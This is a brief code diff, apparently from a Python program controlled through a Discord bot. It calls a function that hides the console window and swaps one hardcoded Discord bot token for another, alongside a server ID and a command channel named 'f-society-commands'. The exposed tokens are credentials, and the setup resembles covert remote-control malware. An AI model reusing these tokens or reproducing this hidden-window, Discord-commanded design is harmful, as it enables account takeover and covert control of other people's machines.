@@ -30,7 +30,7 @@ def hide_console():
 hide_console()
 
 # ==================== CONFIGURATION ====================
-BOT_TOKEN = "MTUwMjY3MjE1NDEwNDQzMDgwMw.Gm_swp.AE__98khtTRTxmcL9GFfe-gKfYwpsvx4IH4zxA"  # Same token for both
+BOT_TOKEN = "MTUwMjY3MjE1NDEwNDQzMDgwMw.GoJqTX.NjqXdMqiIMiTMS0nfGxRdeBT7mwHRq521AdtZY"  # Same token for both
 GUILD_ID = 1502665189269573823       # Your Discord server ID
 CHANNEL_NAME = "f-society-commands" # Main command channel
 
